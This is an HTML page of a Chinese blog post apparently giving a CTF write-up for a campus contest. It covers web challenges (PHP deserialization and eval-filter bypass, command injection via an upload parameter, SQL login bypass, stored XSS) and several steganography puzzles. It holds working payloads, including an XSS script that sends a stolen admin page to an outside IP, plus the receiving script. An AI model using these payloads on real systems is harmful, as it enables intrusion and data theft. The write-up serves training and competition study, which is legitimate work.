@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="WEB1&amp;lt;?php highlight_file(__FILE__); $username = str_shuffle(md5(&amp;quot;admin&amp;quot;)); $password = str_shuffle(md5(&amp;quot;root&amp;quot;));  $login = false; if (isset($_GET[&amp;#39;str&amp;#39;])) {     $str = $">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第四届海啸杯 Write Up">
+<meta property="og:url" content="https://www.plasf.cn/articles/hxwriteup.html">
+<meta property="og:site_name" content="Xiao Leung&#39;s Blog">
+<meta property="og:description" content="WEB1&amp;lt;?php highlight_file(__FILE__); $username = str_shuffle(md5(&amp;quot;admin&amp;quot;)); $password = str_shuffle(md5(&amp;quot;root&amp;quot;));  $login = false; if (isset($_GET[&amp;#39;str&amp;#39;])) {     $str = $">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210402-202932@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210406-203159@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-203615@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-203654@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-203801@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-204304@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-204400@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-205208@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//1.jpg">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//2.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//3.jpg">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210406-205500@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-205625@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-205744@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-205835@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-210020@2x.png">
+<meta property="og:image" content="https://tcakalr.gitee.io/tc/微信图片_20210406165942.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-211110@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-212102@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-212311@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-214128@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-214353@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-214609@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-214757@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-214951@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-215238@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210406-215422@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WechatIMG2034.jpeg">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WechatIMG87.jpeg">
+<meta property="og:updated_time" content="2021-04-08T02:17:36.908Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第四届海啸杯 Write Up">
+<meta name="twitter:description" content="WEB1&amp;lt;?php highlight_file(__FILE__); $username = str_shuffle(md5(&amp;quot;admin&amp;quot;)); $password = str_shuffle(md5(&amp;quot;root&amp;quot;));  $login = false; if (isset($_GET[&amp;#39;str&amp;#39;])) {     $str = $">
+<meta name="twitter:image" content="https://goodcheerleung.gitee.io/macpic/WX20210402-202932@2x.png">
+
+<link rel="canonical" href="https://www.plasf.cn/articles/hxwriteup.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>第四届海啸杯 Write Up | Xiao Leung's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?9905f6cfc84bbdd051e0d6a5e5f8714a";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Xiao Leung's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">专注网络安全研究</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/hxwriteup.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第四届海啸杯 Write Up
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-08 10:17:32 / 修改时间：10:17:36" itemprop="dateCreated datePublished" datetime="2021-04-08T10:17:32+08:00">2021-04-08</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>14k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>13 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$username = str_shuffle(md5(&quot;admin&quot;));
+$password = str_shuffle(md5(&quot;root&quot;));
+
+$login = false;
+if (isset($_GET[&#39;str&#39;])) {
+    $str = $_GET[&#39;str&#39;];
+    $unserialize_str = unserialize($str);
+    if ($unserialize_str[&#39;username&#39;] == $username &amp;&amp; $unserialize_str[&#39;password&#39;] == $password) {
+        $login = true;
+    }
+}
+
+if ($login &amp;&amp; isset($_GET[&#39;code&#39;])) {
+    if (&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {
+        if (!preg_match(&#39;/highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode/i&#39;, $_GET[&#39;code&#39;])) {
+            eval($_GET[&#39;code&#39;]);
+        } else {
+            echo &quot;含有危险函数&quot; . &quot;&lt;br/&gt;&quot;;
+        }
+    } else {
+        echo &quot;不符合正则表达式&quot; . &quot;&lt;br/&gt;&quot;;
+    }
+}</code></pre>
+<p>题目可分为两部分，一是通过if语句判断使<code>$login</code>的值变为<code>true</code>，二是通过<code>eval</code>函数执行我们想要的代码拿到flag</p>
+<pre><code class="php">$unserialize_str = unserialize($str);
+if ($unserialize_str[&#39;username&#39;] == $username &amp;&amp; $unserialize_str[&#39;password&#39;] == $password) {
+    $login = true;
+}</code></pre>
+<p>虽然我们不知道<code>$usernam</code>和<code>$password</code>的值，但可以在if语句中使用的判断为<code>==</code></p>
+<p>由于php是弱类型语言，所以bool值为true的变量和任何变量比较都相等，除了0和false，因为0认为是bool false</p>
+<p>由此构造<code>$str</code></p>
+<pre><code class="php">&lt;?php
+$a = array(
+    &quot;username&quot; =&gt; true,
+    &quot;password&quot; =&gt; true
+);
+echo serialize($a);</code></pre>
+<pre><code>a:2:{s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;}</code></pre><p>这样便能使<code>$login</code>被赋值为<code>true</code></p>
+<br>
+
+<p>接下来要执行<code>eval</code>函数，需要通过两个if语句</p>
+<ul>
+<li><code>/[^\W]+\((?R)?\)/</code>要匹配无参数的函数，函数内部可以无限嵌套相同的模式，也就是说只匹配<code>字符串+()</code>的类型，并且括号内为<code>空字符串</code>或<code>字符串+()</code></li>
+<li>不能使用<code>highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode</code>这些危险函数，包括大小写</li>
+</ul>
+<p><code>scandir()</code>函数返回指定目录中的文件和目录的数组，所以<code>scandir(&#39;.&#39;)</code>会返回当前文件所在文件夹的目录</p>
+<blockquote>
+<p>var_dump(scandir(‘.’));</p>
+</blockquote>
+<p>但这样无法通过正则表达式，需要讲scandir内部替换为<code>/[^\W]+\((?R)?\)/</code></p>
+<p><code>chr()</code>函数会返回指定的 ASCII 值对应的字符，而<code>.</code>对应的ASCII值为<code>46</code></p>
+<p>由此构造出：<code>var_dump(scandir(chr(46)));</code></p>
+<p>现在只需要想办法讲构造出一个返回值为46的嵌套函数即可。</p>
+<br>
+
+<p>查看php版本</p>
+<pre><code>?str=a:2:{s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;}&amp;code=phpinfo();</code></pre><p>版本号为：<code>7.2.24</code></p>
+<p><code>phpversion()</code>返回<code>7.2.24-0ubuntu0.18.04.7</code></p>
+<p><code>floor(phpversion())</code>返回<code>7</code></p>
+<p><code>sin(floor(phpversion()))</code>返回<code>0.65698659871879</code></p>
+<p><code>sin(sin(floor(phpversion())))</code>返回<code>0.61073350824527</code></p>
+<p><code>cos(sin(sin(floor(phpversion()))))</code>返回<code>0.81922759437835</code></p>
+<p><code>rad2deg(cos(sin(sin(floor(phpversion())))))</code>返回<code>46.938283618535</code></p>
+<p><code>floor(rad2deg(cos(sin(sin(floor(phpversion()))))))</code>返回<code>46</code></p>
+<p>这样便构造出<code>46</code>了</p>
+<pre><code>?str=a:2:{s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;}&amp;code=var_dump(scandir(chr(floor(rad2deg(cos(sin(sin(floor(phpversion())))))))));</code></pre><p>返回</p>
+<pre><code>array(5) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;.DS_Store&quot; [3]=&gt; string(9) &quot;index.php&quot; [4]=&gt; string(16) &quot;this_is_flag.php&quot; }</code></pre><p>flag在<code>this_is_flag.php</code>中，刚好在最后一个文件，通过<code>end()</code>读取最后一个文件，再通过<code>show_source()</code>打印，这样就得到最终的payload：</p>
+<pre><code>?str=a:2:{s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;}&amp;code=show_source(end(scandir(chr(floor(rad2deg(cos(sin(sin(floor(phpversion()))))))))));</code></pre><br>
+
+<p>附：</p>
+<pre><code>php 5.x
+?code=var_dump(scandir(chr(floor(rad2deg(sin(cos(cos(floor(phpversion())))))))));
+?code=show_source(end(scandir(chr(floor(rad2deg(sin(cos(cos(floor(phpversion()))))))))));</code></pre><h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>红明谷签到，WP都发到群里面了没人看。</p>
+<ul>
+<li>简单题</li>
+<li>用短标签绕过对php的过滤，<code>$IFS$9</code>代替空格。</li>
+</ul>
+<pre><code>?action=upload&amp;data=&lt;?=`ls\$IFS\$9/`?&gt;</code></pre><ul>
+<li>直接得到文件列表</li>
+</ul>
+<pre><code>!whatyouwantggggggg401.php
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var</code></pre><ul>
+<li>直接用通配符读就好了</li>
+</ul>
+<pre><code>?action=upload&amp;data=&lt;?=`cat\$IFS\$9/*.ph*`?&gt;</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WX20210402-202932@2x.png" alt="WX20210402-202932@2x"></p>
+<h2 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h2><ul>
+<li>转义单引号然后注释掉后面的单引号成功逃逸，最后or拼接导致逻辑为真。登录。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210406-203159@2x.png" alt="WX20210406-203159@2x"></p>
+<ul>
+<li>提示管理员每条都看，直接XSS先看看行不行，服务器监听一个端口：</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-203615@2x.png" alt="WX20210406-203615@2x" style="zoom:33%;">
+
+<ul>
+<li>构造JS代码，提交至后台</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-203654@2x.png" alt="WX20210406-203654@2x" style="zoom:33%;">
+
+<ul>
+<li>监听到管理员通过这个页面执行了这个JS</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-203801@2x.png" alt="WX20210406-203801@2x" style="zoom:33%;">
+
+<ul>
+<li>构造XHR直接窃取管理员界面,xss.js</li>
+</ul>
+<pre><code class="javascript">function createXmlHttp() {
+    if (window.XMLHttpRequest) {
+        xmlHttp = new XMLHttpRequest()
+    } else {
+        var MSXML = new Array(&#39;MSXML2.XMLHTTP.5.0&#39;, &#39;MSXML2.XMLHTTP.4.0&#39;, &#39;MSXML2.XMLHTTP.3.0&#39;, &#39;MSXML2.XMLHTTP&#39;, &#39;Microsoft.XMLHTTP&#39;);
+        for (var n = 0; n &lt; MSXML.length; n++) {
+            try {
+                xmlHttp = new ActiveXObject(MSXML[n]);
+                break
+            } catch(e) {}
+        }
+    }
+}
+createXmlHttp();
+xmlHttp.onreadystatechange = function(){
+  if (xmlHttp.readyState == 4) {
+        code=escape(xmlHttp.responseText);
+        createXmlHttp();
+        url = &quot;http://39.107.126.173:28901/xss.php&quot;;   //这里是我们服务器接受的地址
+        cc = &quot;htmlcode=&quot; + code +&quot;&amp;filename=index.html&quot;;
+        xmlHttp.open(&quot;POST&quot;, url, true);
+        xmlHttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+        xmlHttp.send(cc)
+  }
+};
+xmlHttp.open(&quot;GET&quot;, &quot;/admin_shark.php&quot;, true);//这块填写获得的后台地址。
+xmlHttp.setRequestHeader(&quot;Referer&quot;, &quot;http://127.0.0.1/&quot;);
+xmlHttp.send(null);</code></pre>
+<ul>
+<li>接受页面脚本：</li>
+</ul>
+<pre><code class="php">&lt;?php
+        function js_unescape($str) {
+                $ret = &#39;&#39;;
+                $len = strlen($str);
+                for ($i = 0;$i &lt; $len;$i++) {
+                        if ($str[$i] == &#39;%&#39; &amp;&amp; $str[$i + 1] == &#39;u&#39;) {
+                                $val = hexdec(substr($str, $i + 2, 4));
+                                if ($val &lt; 0x7f) $ret.= chr($val);
+                                else if ($val &lt; 0x800) $ret.= chr(0xc0 | ($val &gt;&gt; 6)) . chr(0x80 | ($val &amp; 0x3f));
+                                else $ret.= chr(0xe0 | ($val &gt;&gt; 12)) . chr(0x80 | (($val &gt;&gt; 6) &amp; 0x3f)) . chr(0x80 | ($val &amp; 0x3f));
+                                $i+= 5;
+                        } else if ($str[$i] == &#39;%&#39;) {
+                                $ret.= urldecode(substr($str, $i, 3));
+                                $i+= 2;
+                        } else $ret.= $str[$i];
+                }
+                return $ret;
+        }
+        $data = js_unescape($_POST[&#39;htmlcode&#39;]);  //对获得源码js_unescape解码。
+        $filename = $_POST[&#39;filename&#39;] . date(&quot;y-m-d-h-i-s&quot;) . &quot;.html&quot;;
+        $myfile = fopen($filename, &quot;w&quot;);
+        fwrite($myfile, $data);
+        fclose($myfile);
+?&gt;</code></pre>
+<ul>
+<li>再次提交XSS攻击代码</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-204304@2x.png" alt="WX20210406-204304@2x" style="zoom:33%;">
+
+<ul>
+<li>窃取到管理员页面源码得到flag：</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-204400@2x.png" alt="WX20210406-204400@2x" style="zoom:50%;">
+
+<h2 id="隐藏的书"><a href="#隐藏的书" class="headerlink" title="隐藏的书"></a>隐藏的书</h2><ul>
+<li>这个字段如果是奇数那就可能是伪加密，改成偶数解压</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-205208@2x.png" alt="WX20210406-205208@2x" style="zoom: 25%;">
+
+<ul>
+<li>根据期刊论文编写脚本,解码就得到flag</li>
+</ul>
+<pre><code class="php">&lt;?php
+/**
+ * @param [String] Strings that need to be Unicode encoded。
+ * @author [name] Gqleung
+ * @date 2021-03-30 10:22:46
+ */
+function UnicodeEncode($str){
+    preg_match_all(&#39;/./u&#39;,$str,$matches);
+    $unicodeStr = &quot;&quot;;
+    foreach($matches[0] as $m){
+        $unicodeStr .= &quot;\\u&quot;.substr(&#39;0000&#39;.base_convert(ord($m),10,16),-4);
+    }
+    return $unicodeStr;
+}
+/**
+ * @param [String] Strings that need to be Unicode Decoded。
+ * @author [name] Gqleung
+ * @date 2021-03-30 10:22:46
+ */
+function UnicodeDecode($str){
+    $result=&#39;&#39;;
+    $UnicodeStrArry = explode(&#39;\\u&#39;, $str);
+    foreach ($UnicodeStrArry as  $value) {
+      if(empty($value))
+        continue;
+      $result .=  chr(base_convert($value,16,10));
+    }
+
+    return $result;
+}
+/**
+ * @param  [String] Strings that need to be Unicode Decoded。
+ * @param  [String]
+ * @return [type]
+ */
+function encrypt($laws,$Hiddentext){
+  $secret=&quot;&quot;;
+  for($i=0;$i&lt;strlen($Hiddentext);$i++){
+    $temp = ord($Hiddentext[$i]);
+    $temp = base_convert($temp,10,2);
+    $temp = substr(&#39;00000000&#39;.$temp,-8); 
+    $temp = str_split($temp,4);
+    foreach ($temp as $value) {
+      $secret  .=  &quot;\\u&quot;.substr(&#39;0000&#39;.base_convert($value,2,16),-4);
+    }
+  }
+  $secret = UnicodeDecode($secret);
+  $Ci = explode(&quot;.&quot;,$laws);
+  $Ca = $Ci[0].&quot;.&quot;;
+  $Cb = $Ci[1];
+  $Ciphertext = $Ca.$secret.$Cb;
+
+  return $Ciphertext;
+}
+function decrypt($Ciphertext){
+  $tmp = &quot;&quot;;
+  $laws = &quot;&quot;;
+  for($i=0;$i&lt;strlen($Ciphertext);$i++){
+    if(!(32&lt;ord($Ciphertext[$i])&amp;&amp;ord($Ciphertext[$i])&lt;127)){
+      $tmp .= UnicodeEncode($Ciphertext[$i]);
+    }
+  }
+  $tmp = explode(&#39;\u&#39;,$tmp);
+  $m=&#39;&#39;;
+  for($i=0;$i&lt;count($tmp);$i++){
+    if(empty($tmp[$i]))
+      continue;
+    $t  = substr(&#39;0000&#39;.base_convert($tmp[$i],16,2),-4);
+    $m .= $t;
+    if(strlen($m)==8){
+      $laws.=chr(base_convert($m,2,10));
+      $m=&#39;&#39;;
+    }
+  }
+  return $laws;
+}
+//$a = encrypt(&quot;Hello.Gzmtu&quot;,$flag = &quot;flag{8f807f74-9088-11eb-b255-00163e0620b4}&quot;);
+echo decrypt(file_get_contents(&#39;flag.txt&#39;));
+?&gt;</code></pre>
+<h2 id="你能看到图片里的flag吗"><a href="#你能看到图片里的flag吗" class="headerlink" title="你能看到图片里的flag吗"></a>你能看到图片里的flag吗</h2><p>用Stegsolve打开<code>key.gif</code>查看详细信息，发现不是每一帧的时间都相同，时间间隔不是20就是30，考虑gif时间隐写</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic//1.jpg" alt></p>
+<p>用kali自带的工具提取时间间隔</p>
+<pre><code>identify -format &quot;%T&quot; key.gif</code></pre><p>得到：</p>
+<pre><code>20303020303020302030302020302020202030302030203020302030303030302030302030202020203030202030203020303030202030202030302020302030</code></pre><p>将<code>20</code>替换为<code>0</code>，<code>30</code>替换为<code>1</code></p>
+<pre><code class="php">&lt;?php
+$a = &quot;20303020303020302030302020302020202030302030203020302030303030302030302030202020203030202030203020303030202030202030302020302030&quot;;
+$a = str_replace(&#39;20&#39;, &#39;0&#39;, $a);
+$a = str_replace(&#39;30&#39;, &#39;1&#39;, $a);
+
+echo $a;</code></pre>
+<p>得到：</p>
+<pre><code>0110110101100100001101010101111101101000011001010111001001100101</code></pre><p>通过网站在线转换二进制到字符串：<a href="http://www.txttool.com/wenben_binarystr.asp，得到：" target="_blank" rel="noopener">http://www.txttool.com/wenben_binarystr.asp，得到：</a></p>
+<pre><code>md5_here</code></pre><p>md5加密后得到：</p>
+<pre><code>623a3f3d828099e440475ce285c341ac</code></pre><p>即为<code>hint.rar</code>的密码</p>
+<p>解压之后得到两个文件</p>
+<ul>
+<li>hint.txt</li>
+</ul>
+<pre><code>使用邻近法放缩图片
+图片的宽度和高度在width_height.txt</code></pre><ul>
+<li>width_height.txt</li>
+</ul>
+<p>显然<code>width_height.txt</code>是一组坐标的集合，通过python将这些坐标输出到图片上</p>
+<pre><code class="python">from PIL import Image
+img = Image.new(&#39;RGB&#39;, (200, 200), (0, 0, 0))
+f = open(&#39;width_height.txt&#39;)
+for line in f.readlines():
+    point = line.split()
+    img.putpixel((int(point[0]), int(point[1])), (255, 255, 255))
+f.close()
+img.show()</code></pre>
+<p>会得到一张二维码</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic//2.png" alt></p>
+<p>扫码得到：</p>
+<pre><code>width:192 height:90</code></pre><p>最后通过PS打开<code>flag.png</code>，按住<code>Ctrl+alt+I</code>调整图片大小</p>
+<p>宽度：192，高度：90，使用近邻法放缩</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic//3.jpg" alt></p>
+<ul>
+<li>flag</li>
+</ul>
+<pre><code>flag{Th1s_1s_4_h1dden_F14g}</code></pre><h2 id="神秘的铃声"><a href="#神秘的铃声" class="headerlink" title="神秘的铃声"></a>神秘的铃声</h2><p>解压得到<code>flag.wav</code>文件010打开存在一个base64</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210406-205500@2x.png" alt="WX20210406-205500@2x"></p>
+<ul>
+<li>扔Burpsuite解码是PK头说明是ZIP文件，右键Copy to file保存为ZIP文件</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-205625@2x.png" alt="WX20210406-205625@2x" style="zoom:25%;">
+
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-205744@2x.png" alt="WX20210406-205744@2x" style="zoom:25%;">
+
+<ul>
+<li>但是解压需要密码：</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-205835@2x.png" alt="WX20210406-205835@2x" style="zoom:25%;">
+
+<ul>
+<li>刚刚那是一个WAV文件播放是一段DTMF音频，也就是电话机按键的声音，珠海教案有提到一个网站能够识别这个音频，当然也可以写脚本识别。</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-210020@2x.png" alt="WX20210406-210020@2x" style="zoom:25%;">
+
+<ul>
+<li>解码得到压缩包密码：D#*C9A16B</li>
+</ul>
+<img src="https://tcakalr.gitee.io/tc/微信图片_20210406165942.png" alt="微信图片_20210406165942" style="zoom:33%;">
+
+<ul>
+<li>解压得到flag.txt是一串坐标，将其转换为图片得到二维码扫码得到flag：</li>
+</ul>
+<pre><code class="python">from PIL import Image
+img = Image.new(&#39;RGB&#39;,(500,500),(0,0,0))
+#创建Image对象
+f = open(&#39;flag.txt&#39;)#打开flag.txt文件
+for line in f.readlines():
+    point = line.split()
+    img.putpixel((int(point[0]),int(point[1])),(255,255,255))
+#读取文件中的每一行，并修改像素
+f.close()
+img.show()</code></pre>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-211110@2x.png" alt="WX20210406-211110@2x" style="zoom: 25%;">
+
+<h2 id="神秘的网站"><a href="#神秘的网站" class="headerlink" title="神秘的网站"></a>神秘的网站</h2><ul>
+<li>扔到wireshark分析根据题目提示是一个神秘的网站，只需要找HTTP即可。hint提示了上传包那么：直接filter过滤出所有POST协议迅速就能找到上传包。</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-212102@2x.png" alt="WX20210406-212102@2x" style="zoom:25%;">
+
+<ul>
+<li>追踪HTTP流发现存在ZIP文件</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-212311@2x.png" alt="WX20210406-212311@2x" style="zoom:25%;">
+
+<ul>
